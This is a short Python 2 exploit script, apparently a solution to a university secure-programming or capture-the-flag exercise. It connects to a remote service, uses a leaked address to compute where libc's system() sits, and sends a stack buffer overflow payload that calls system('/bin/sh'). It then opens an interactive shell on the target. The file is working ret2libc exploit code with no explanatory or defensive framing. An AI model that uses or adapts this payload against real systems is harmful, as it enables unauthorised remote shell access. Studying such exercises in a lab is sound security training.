# Echo client program
import telnetlib
import socket,sys

# The remote host
host = 'secprog.cs.nctu.edu.tw' 
port = 10107

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))


buf = s.recv(64)
sys.stdout.write(buf)
sys.stdout.flush()

# objdump -D libc.so | grep "libc_start_main>"
# 00019970 <__libc_start_main>:
# objdump -D libc.so | grep "system>"
# 0003fc40 <__libc_system>:

main_addr = buf[44:52].decode("hex")
print "main_addr: " + main_addr.encode("hex")
system_addr = str(hex(int(main_addr.encode("hex"), 16) + 156368)[2:-1]).decode("hex")
print "system_addr: " + system_addr.encode("hex")

# 0x8048620 "/bin/sh"
sh_addr = "\x08\x04\x86\x20"
print "bin/sh_addr: " + sh_addr.encode("hex")
payload = "a"*24 + system_addr[::-1] + "bbbb" + sh_addr[::-1] + "\n"
s.send(payload)
print payload

t = telnetlib.Telnet()
t.sock = s 
t.interact()
